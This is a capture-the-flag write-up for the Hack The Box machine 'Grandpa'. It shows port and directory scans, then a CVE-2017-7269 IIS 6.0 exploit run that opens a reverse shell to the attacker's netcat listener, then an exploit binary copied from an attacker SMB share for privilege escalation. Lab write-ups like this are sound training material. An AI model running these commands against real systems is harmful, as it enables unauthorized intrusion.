# Hackthebox Grandpa

Reset the machine just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.10.10.14
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-06 07:40 EST
Nmap scan report for 10.10.10.14
Host is up (0.040s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Mon, 06 Dec 2021 12:42:17 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.37 seconds

```

IIS webserver is running a website, and opening it with a browser shows just an 'under construction' page.

While we start searching IIS 6.0 vulnerabilities, kick off dirb to find possible directories. Amplify .aspx since this is IIS, and don't do recursive search to begin with.

```
$ dirb http://10.10.10.14 /usr/share/wordlists/dirb/common.txt -r -X .aspx

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec  6 07:45:20 2021
URL_BASE: http://10.10.10.14/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Not Recursive
EXTENSIONS_LIST: (.aspx) | (.aspx) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.14/ ----
+ http://10.10.10.14/~adm.aspx (CODE:500|SIZE:3026)                                                                                                
+ http://10.10.10.14/~admin.aspx (CODE:500|SIZE:3026)                                                                                              
+ http://10.10.10.14/~administrator.aspx (CODE:500|SIZE:3026)                                                                                      
+ http://10.10.10.14/~amanda.aspx (CODE:500|SIZE:3026)                                                                                             
+ http://10.10.10.14/~apache.aspx (CODE:500|SIZE:3026)                                                                                             
+ http://10.10.10.14/~bin.aspx (CODE:500|SIZE:3026)                                                                                                
+ http://10.10.10.14/~ftp.aspx (CODE:500|SIZE:3026)                                                                                                
+ http://10.10.10.14/~guest.aspx (CODE:500|SIZE:3026)                                                                                              
+ http://10.10.10.14/~http.aspx (CODE:500|SIZE:3026)                                                                                               
+ http://10.10.10.14/~httpd.aspx (CODE:500|SIZE:3026)                                                                                              
+ http://10.10.10.14/~log.aspx (CODE:500|SIZE:3026)                                                                                                
+ http://10.10.10.14/~logs.aspx (CODE:500|SIZE:3026)                                                                                               
+ http://10.10.10.14/~lp.aspx (CODE:500|SIZE:3026)                                                                                                 
+ http://10.10.10.14/~mail.aspx (CODE:500|SIZE:3026)                                                                                               
+ http://10.10.10.14/~nobody.aspx (CODE:500|SIZE:3026)                                                                                             
+ http://10.10.10.14/~operator.aspx (CODE:500|SIZE:3026)                                                                                           
+ http://10.10.10.14/~root.aspx (CODE:500|SIZE:3026)                                                                                               
+ http://10.10.10.14/~sys.aspx (CODE:500|SIZE:3026)                                                                                                
+ http://10.10.10.14/~sysadm.aspx (CODE:500|SIZE:3026)                                                                                             
+ http://10.10.10.14/~sysadmin.aspx (CODE:500|SIZE:3026)                                                                                           
+ http://10.10.10.14/~test.aspx (CODE:500|SIZE:3026)                                                                                               
+ http://10.10.10.14/~tmp.aspx (CODE:500|SIZE:3026)                                                                                                
+ http://10.10.10.14/~user.aspx (CODE:500|SIZE:3026)                                                                                               
+ http://10.10.10.14/~webmaster.aspx (CODE:500|SIZE:3026)                                                                                          
+ http://10.10.10.14/~www.aspx (CODE:500|SIZE:3026)                                                                                                
                                                                                                                                                   
-----------------
END_TIME: Mon Dec  6 07:48:19 2021
DOWNLOADED: 4612 - FOUND: 25

```

gobuster and another directory file:

```
$ gobuster dir -u http://10.10.10.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                          1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/06 08:13:42 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 149] [--> http://10.10.10.14/images/]
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.14/Images/]
/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.14/IMAGES/]
/_private             (Status: 403) [Size: 1529]                                
                                                                                
===============================================================
2021/12/06 08:27:02 Finished
===============================================================
```

None of the directories lead to anywhere though.

## Vulnerability analysis

Nikto to show us the first findings:

```
$ nikto -h 10.10.10.14
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2021-12-06 08:24:33 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPPATCH PROPFIND MKCOL LOCK COPY UNLOCK SEARCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2021-12-06 08:29:54 (GMT-5) (321 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

WebDAV is enable, check it:

```
$ davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: H7W6Qkw1c7XjcZi
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	php	FAIL
PUT	jsp	FAIL
PUT	txt	FAIL
PUT	shtml	FAIL
PUT	cfm	FAIL
PUT	cgi	FAIL
PUT	pl	FAIL
PUT	asp	FAIL
PUT	aspx	FAIL
PUT	html	FAIL
PUT	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
```

Nothing there.

IIS 6.0 is old and has vulnerabilities:

```
$ searchsploit iis 6.0                               
--------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                 | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                          | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                            | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                     | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                           | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                         | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                          | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                      | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                      | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                  | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                         | windows/remote/19033.txt
--------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### Exploit IIS 6.0 supporting PUT and MOVE

Credits go to https://notsosecure.com/owning-iis-60-when-webserver-supports-put-and-move-http-methods

Did not try this vulnerability yet

### Exploit CVE-2017-7269

Credits go to https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
Script modified to handle the strings and bytes for a more modern python version:

Run the script

```
$ python iis6_reverse_shell.py 10.10.10.14 80 10.10.14.4 5555
```

And we get a shell for our listener

```
$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>

```

## Privilege escalation

verify the operating system and patches

```
C:\WINDOWS\Temp>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 48 Minutes, 38 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1998 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 761 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,300 MB
Page File: In Use:         170 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

Windows exploit suggester is a good start, remember to use the version ported to python 3: https://raw.githubusercontent.com/aysebilgegunduz/Windows-Exploit-Suggester/pr_version/windows-exploit-suggester.py

As ths is almost unpatched Windows 2003 SP2 32-bit, there are loads of vulnerabilities.

Looks like the server does not have PowerShell installed.

### MS15-051

Credits go to https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

Initiate a samba share in the folder where the exploit is located

```
kali㉿kali)-[~/…/CTF/hackthebox/Grandpa/MS15-051]
└─$ smbserver.py share .
```

And then fetch the file from the target host

```
C:\WINDOWS\Temp>copy \\10.10.14.4\share\Taihou32.exe .
copy \\10.10.14.4\share\Taihou32.exe .
        1 file(s) copied.

C:\WINDOWS\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp

12/06/2021  06:08 PM    <DIR>          .
12/06/2021  06:08 PM    <DIR>          ..
12/06/2021  05:01 PM           168,771 Taihou32.exe
```

Unfortunately this fails with "Program too big to fit in memory". Should compile it myself, but let's try something else.


